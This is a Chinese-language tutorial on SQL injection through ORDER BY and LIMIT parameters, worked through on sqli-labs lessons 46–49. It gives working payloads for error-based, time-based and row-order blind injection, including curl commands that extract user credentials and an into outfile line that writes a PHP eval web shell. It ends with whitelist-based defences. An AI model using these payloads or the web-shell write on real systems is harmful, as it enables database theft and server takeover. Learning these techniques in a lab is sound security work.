# 07-ORDER BY 注入

> 前置：[[../03-报错注入|报错注入]] · [[06-AND_OR注入|AND/OR 注入]]
>
> sqli-labs 对照：less-46、less-47、less-48、less-49（sort 参数）

## 一、order by 位置的特殊性

典型漏洞代码：

```php
$id = $_GET['sort'];
$sql = "SELECT * FROM users ORDER BY $id";
```

order by 后面的参数**不是 WHERE 条件的一部分**，而是语法关键字位置，带来两个根本限制：

1. **不能 union**——`1 union select 1,2,3` 在 order by 之后是语法错误
2. **引号闭合逻辑不同**——less-46 数字型直接拼；less-47 是 `ORDER BY '$id'` 单引号闭合，但引号内内容会被当作列名/表达式求值报错

所以这一场景的武器库只剩：报错注入、时间盲注、布尔盲注（利用排序结果差异）、以及写文件等扩展手段。

### order by 的合法形态（payload 必须兼容）

| 输入 | SQL 语义 |
|------|---------|
| 数字 `1` | 按第 1 列排序 |
| 列名 `username` | 按该列排序 |
| 表达式 `rand()` / `if(...)` | 按表达式求值结果排序 ← 注入空间所在 |
| `IF(cond, colA, colB)` | 条件选列排序 ← 盲注侧信道 |

**表达式位置可以放任何返回标量的子查询与函数**——这就是 updatexml/sleep/if 都能用的原因。

## 二、利用手段一览

### 2.1 报错注入（首选）

updatexml/extractvalue 可以**直接放在排序表达式位置**：

```bash
# less-46: 数字型
curl -s "http://127.0.0.1/sqli-labs/Less-46/?sort=1%20and%20updatexml(1,concat(0x7e,database()),1)"
# XPATH syntax error: '~security'

# 爆数据（分段）
curl -s "http://127.0.0.1/sqli-labs/Less-46/?sort=1%20and%20updatexml(1,concat(0x7e,substr((select%20group_concat(username,0x3a,password)%20from%20users),1,30)),1)"

# less-47: 单引号闭合
curl -s "http://127.0.0.1/sqli-labs/Less-47/?sort=1'%20and%20extractvalue(1,concat(0x7e,database()))%20and%20'1"='1'
```

less-48（数字型盲注，无报错回显）与 less-49（单引号时间盲注）是 46/47 的盲注变体，payload 骨架相同、只换提取手段。

### 关卡对照表

| 关卡 | 闭合方式 | 回显条件 | 主打手段 |
|------|---------|---------|---------|
| less-46 | 数字型 | 有报错 | 报错注入 |
| less-47 | `'$id'` 单引号 | 有报错 | 报错注入 |
| less-48 | 数字型 | 无报错 | 时间/排序差异盲注 |
| less-49 | `'$id'` 单引号 | 无报错 | 时间盲注 |

### 2.2 基于时间的盲注

无报错回显时用 if + sleep：

```sql
-- 条件为真延迟 5 秒
sort=if(substr(database(),1,1)='s',sleep(5),0)
-- 字符型闭合版（less-47）
sort=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0) and '1'='1
```

```bash
curl -s -o /dev/null -w "%{time_total}\n" \
  "http://127.0.0.1/sqli-labs/Less-49/?sort=1'%20and%20if(substr(database(),1,1)='s',sleep(5),0)%20and%20'1'='1"
# 输出约 5.x 秒 → 条件为真
```

### 2.3 if + true/false 排序差异盲注

order by 的本质是**改变行的顺序**，这给了我们一个不依赖报错/延时的侧信道：

```sql
-- 用已知列做条件排序
sort=if(ascii(substr(database(),1,1))>100,id,username)
-- database() 首字符 > 100 时按 id 排序，否则按 username 排序 → 页面第一行不同
```

观察页面第一行/行序变化即可逐位猜解。也可用更隐蔽的：

```sql
sort=rand(if(ascii(substr(database(),1,1))=115,1,2))
```

### 排序差异盲注的自动化判断逻辑

```text
1. 基准请求: sort=id          记录第一行内容 A1
2. 对照请求: sort=username    记录第一行内容 B1（确认 id 与 username 排序首行不同）
3. 注入请求: sort=if(条件,id,username)
   第一行 = A1 → 条件真；第一行 = B1 → 条件假
4. 二分法逐位猜解 ascii(substr(...))
```

相比时间盲注每请求 5 秒，排序差异盲注每个请求毫秒级完成，**速度提升两个数量级**，是 order by 场景盲注的首选。

### 三种手段对比

| 手段 | 条件 | 速度 |
|------|------|------|
| 报错注入 | 错误信息回显 | 最快，一次约 32 字符 |
| 时间盲注 | 无任何回显差异 | 慢，一位一请求 |
| 排序差异盲注 | 页面展示多行结果且行序可见 | 中速，无需延时 |

## 三、limit 后的扩展（MySQL 5.x 提一嘴）

若参数落在 limit 之后（如分页 `LIMIT $offset,$rows`），MySQL 5.x 还有一条历史路线：

```sql
LIMIT 0,1 procedure analyse(extractvalue(rand(),concat(0x7e,database())),1)
```

`procedure analyse()` 在 MySQL **5.x 可用、5.7 起逐步废弃、8.0 已移除**——CTF 遇到老环境可试，新版本直接放弃。

limit 位置还有一条通用思路——**控制返回行数做布尔判断**：

```sql
-- limit 数字位注入: 通过改变偏移让页面显示不同行，构造差异侧信道
LIMIT 3,1     vs     LIMIT 0,1
-- 若 offset 可控且页面只展示一行，配合 union 之外的子查询也能带出数据
```

## 四、into outfile 写文件提一嘴

order by / limit 场景若权限允许，可以尝试把查询结果导出为文件（需要 `secure_file_priv` 允许 + DBA 权限）：

```sql
sort=1 into outfile '/var/www/html/test.txt'
-- 组合写 shell 的思路:
sort=1 into outfile '/var/www/html/shell.php' fields terminated by '<?php eval($_GET[1]);?>'
```

限制条件多（secure_file_priv 默认 NULL、需绝对路径、需 FILE 权限），CTF 中作为备选路径记忆。

前置检查 payload：

```sql
-- 确认 secure_file_priv 允许的目录（报错注入带出）
sort=1 and updatexml(1,concat(0x7e,(select @@secure_file_priv)),1)
-- NULL 表示完全禁止读写文件 → 放弃此路线
```

## 五、易错点

| 易错点 | 说明 |
|-------|------|
| 尝试 union select | order by 位置语法不允许，union 直接报错浪费轮次 |
| 忘记 less-47/49 是引号闭合 | `sort=1' and ... and '1'='1` 与数字型 payload 不同 |
| sleep 放在无求值处 | 部分 ORM 会把排序字段白名单化或加反引号包裹，先确认原样拼接 |
| 盲注判断依据选错行 | 排序差异盲注要选稳定可见的第一行，避免分页干扰 |
| procedure analyse 打 MySQL 8 | 该函数已移除，8.0 只会得到函数不存在错误 |
| 排序字段被反引号包裹 | `` ORDER BY `$_GET[sort]` `` 时引号内是标识符而非表达式，报错注入失效只能打盲注变体 |

## 六、防御

| 措施 | 说明 |
|------|------|
| 白名单排序字段映射 | **标准解法**：前端传 `sort=name`，服务端映射到固定 SQL 片段 `$map=['name'=>'username','age'=>'age']` |
| 不接受任意表达式 | 校验只允许 `[a-zA-Z0-9_]`，杜绝空格与括号 |
| 方向参数同样白名单 | asc/desc 也走映射，防止在方向位注入 |
| 参数化查询的边界 | prepared statement 不能绑定列名/关键字，排序字段必须代码层白名单 |

```php
// 防御示例
$allowed = ['username' => 'username', 'id' => 'id', 'time' => 'reg_time'];
$order = $allowed[$_GET['sort']] ?? 'id';      // 不在表内则回退默认值
$sql = "SELECT * FROM users ORDER BY $order";  // 此时拼接是安全的
```

---
**返回** [[mysql结构总目录|mysql结构 总目录]]
